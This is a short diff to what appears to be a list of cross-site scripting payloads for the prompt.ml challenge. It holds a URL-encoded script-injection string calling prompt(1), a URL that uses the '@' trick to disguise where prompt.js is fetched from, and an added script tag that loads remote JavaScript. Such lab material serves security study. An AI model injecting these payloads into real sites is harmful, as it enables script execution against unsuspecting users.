@@ -130,3 +130,6 @@ http%3A%2F%2Fprompt.ml%2Fjs%2Ftest.js%22%3E%3Cscript%3Eprompt(1)%3C%2Fscrip%3E
 
 
 http://prompt.ml%2f@github.com/hhhparty/security/blob/master/courses/webtestguide/labs/prompt.js
+
+
+<script src="https://github.com/HDH-AISEC/HDH-AISEC.github.io/tree/master/projects/atest/prompt.js"></script>
